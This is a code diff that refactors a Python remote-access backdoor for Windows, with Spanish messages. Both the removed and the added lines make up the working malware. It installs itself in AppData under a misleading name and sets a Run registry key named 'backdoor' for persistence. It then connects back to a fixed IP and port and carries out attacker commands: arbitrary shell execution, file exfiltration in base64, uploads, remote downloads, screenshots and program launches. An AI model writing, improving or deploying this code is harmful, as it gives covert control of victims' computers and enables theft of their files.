@@ -11,15 +11,13 @@ import sys
 import time
 import requests
 import mss
- 
-def enviar_datos(data):
-    datasend = json.dumps(data)
-    sock.send(datasend)
- 
-def screenshot():
-    screen = mss.mss()
-    screen.shot()
-    
+
+def create_persistence():
+    location = os.environ['appdata'] + "\\windows32.exe"
+    if not os.path.exists(location):
+        shutil.copyfile(sys.executable,location)
+        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
+
 def admin_check():
     global admin
     try:
@@ -28,92 +26,81 @@ def admin_check():
         admin = "ERROR, privilegios insuficientes"
     else:
         admin = "Privilegios de administrador"
- 
-    
-def recibir_datos():
-    data = ""
-    while True:
-        try:
-            data = data + sock.recv(1024)
-            return json.loads(data)
-        except ValueError:
-            continue
- 
-def create_persistence():
-    location = os.environ['appdata'] + "\\windows32.exe"
-    if not os.path.exists(location):
-        shutil.copyfile(sys.executable,location)
-        subprocess.call('reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v backdoor /t REG_SZ /d "' + location + '"', shell=True)
-        
+
 def connection():
     while True:
-        time.sleep(2)
+        time.sleep(5)
         try:
-            sock.connect(('192.168.253.15',7777))
+            cliente.connect(('192.168.253.15',7777))
             shell()
         except:
             connection()
- 
-def download(url):
+
+def screenshot():
+    screen = mss.mss()
+    screen.shot()
+
+def download_file(url):
     file_download = requests.get(url)
     name_file = url.split("/")[-1]
-    with open(name_file,'wb') as file_out:
-        file_out.write(file_download.content)
- 
+    with open(name_file,'wb') as file_get:
+        file_get.write(file_download.content)
+
 def shell():
+    current_dir = os.getcwd()
+    cliente.send(current_dir)
     while True:
-        s = sock.recv(2048)
-        if s == "q":
+        res = cliente.recv(1024)
+        if res == "exit":
             break
-        elif s[:2] == "cd" and len(s) > 1:
+        elif res[:2] == "cd" and len(res) > 2:
             try:
-                os.chdir(s[3:])
-                sock.send(str(os.getcwd()))
+                os.chdir(res[3:])
+                cliente.send(str(os.getcwd()))
             except:
                 continue
-        elif s[:8] == "download":
-            with open(s[9:],'rb') as file_download:
-                sock.send(base64.b64encode(file_download.read()))
-        elif s[:6] == "upload":
-            with open(s[7:],'wb') as file_upload:
-                datos = sock.recv(20480)
+        elif res[:8] == "download":
+            with open(res[9:],'rb') as file_download:
+                cliente.send(base64.b64encode(file_download.read()))
+        elif res[:6] == "upload":
+            with open(res[7:],'wb') as file_upload:
+                datos = cliente.recv(30000)
                 file_upload.write(base64.b64decode(datos))
-        elif s[:3] == "get":
+        elif res[:3] == "get":
             try:
-                download(s[4:])
-                sock.send("Archivo descargado!")
+                download_file(res[4:])
+                cliente.send("Archivo descargado!")
             except:
-                sock.send("Error al descargar el archivo")
-        elif s[:10] == "screenshot":
+                cliente.send("Error al descargar el archivo")
+        elif res[:10] == "screenshot":
             try:
                 screenshot()
                 with open("monitor-1.png",'rb') as sc:
-                    sock.send(base64.b64encode(sc.read()))
+                    cliente.send(base64.b64encode(sc.read()))
                 os.remove('monitor-1.png')
             except:
-                sock.send(base64.b64encode("fail"))
-        elif s[:5] == "check":
+                cliente.send(base64.b64encode("fail"))
+        elif res[:5] == 'start':
+            try:
+                subprocess.Popen(res[6:],shell=True)
+                cliente.send("Programa iniciado!")
+            except:
+                cliente.send("Error al iniciar el programa")
+        elif res[:5] == "check":
             try:
                 admin_check()
-                sock.send(admin)
+                cliente.send(admin)
             except:
-                sock.send("No pude realizar la tarea")
-        elif s[:5] == 'start':
-            try:
-                subprocess.Popen(s[6:],shell=True)
-                sock.send("Programa iniciado!")
-            except:
-                sock.send("Error al iniciar el programa")
+                cliente.send("No pude realizar la tarea")
         else:
-            result = subprocess.Popen(s, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
-            proc = result.stdout.read() + result.stderr.read()
-            if len(proc) == 0:
-                sock.send("1")
+            proc = subprocess.Popen(res, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
+            result = proc.stdout.read() + proc.stderr.read()
+            if len(result) == 0:
+                cliente.send("1")
             else:
-                sock.send(proc)
+                cliente.send(result)
                 
 create_persistence()
-sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+cliente = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 connection()
-shell()
-sock.close()
+cliente.close()
